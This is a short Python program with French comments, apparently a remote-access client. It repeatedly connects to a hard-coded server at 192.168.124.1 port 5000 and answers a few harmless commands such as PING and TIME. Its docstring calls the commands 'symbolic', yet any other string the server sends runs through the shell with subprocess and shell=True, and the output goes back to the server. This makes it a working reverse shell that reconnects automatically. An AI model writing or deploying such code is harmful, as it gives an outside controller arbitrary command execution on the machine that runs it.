import socket
import threading
import time
import platform
import subprocess

def execute_command(cmd):
    """Interprète une commande SYMBOLIQUE envoyée par le serveur."""

    if cmd == "PING":
        return "PONG"

    elif cmd == "INFO":
        return f"Système : {platform.system()} | Machine : {platform.node()}"

    elif cmd == "TIME":
        return f"Heure actuelle : {time.ctime()}"

    elif cmd.startswith("ECHO:"):
        return cmd[5:]  # renvoyer le texte

    else:
        commande = cmd  # Exemple Windows ("ls" pour Linux/Mac)
        resultat = subprocess.check_output(commande, shell=True, text=True)

        return resultat


def listen_to_server(sock):
    """Thread qui écoute les commandes venant du serveur."""
    while True:
        try:
            data = sock.recv(1024).decode()
            if not data:
                break

            print(f"[Commande reçue] {data}")
            réponse = execute_command(data)
            sock.send(réponse.encode())

        except:
            break


def connect_to_server(ip, port):
    """Essaye de se connecter, retente toutes les 5 secondes."""
    while True:
        try:
            print("[Connexion] Tentative de connexion…")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            print("[Connexion réussie]")
            return s

        except Exception:
            print("[Serveur OFF] Nouvelle tentative dans 5 sec…")
            time.sleep(5)

def main():
    IP = "192.168.124.1"
    PORT = 5000

    while True:
        server = connect_to_server(IP, PORT)

        t = threading.Thread(target=listen_to_server, args=(server,), daemon=True)
        t.start()

        t.join()

        print("[INFO] Déconnecté → tentative de reconnexion dans 1 sec…")
        time.sleep(1)


if __name__ == "__main__":
    main()
